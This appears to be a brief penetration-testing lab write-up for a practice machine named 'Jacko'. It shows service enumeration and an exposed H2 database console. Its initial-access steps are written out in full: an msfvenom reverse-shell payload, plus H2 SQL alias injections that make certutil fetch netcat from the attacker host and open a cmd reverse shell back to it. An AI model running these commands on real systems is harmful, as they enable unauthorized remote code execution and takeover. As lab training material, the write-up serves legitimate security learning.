# Jacko

### Enumeration

```
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
8082/tcp open  http          H2 database http console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods: 
|_  Supported Methods: GET POST
|_http-title: H2 Console
```

http://192.168.65.66/html/main.html - H2 Database Engine

http://192.168.65.66:8082 - Connect - H2 Console - H2 1.4.199 (2019-03-13)

H2 Database 1.4.199 - JNI Code Execution

https://www.exploit-db.com/exploits/49384

[https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)

### Initial Access

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.65 LPORT=80 -f exe -o shell.exe
```

```
# Execute respectively

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.49.65/nc64.exe /Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("/Windows/Temp/nc.exe -e cmd 192.168.49.65 80").getInputStream()).useDelimiter("\\Z").next()');
```

### PrivEsc

SeImpersonateToken - Enabled

OR

PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation

https://www.exploit-db.com/exploits/49382
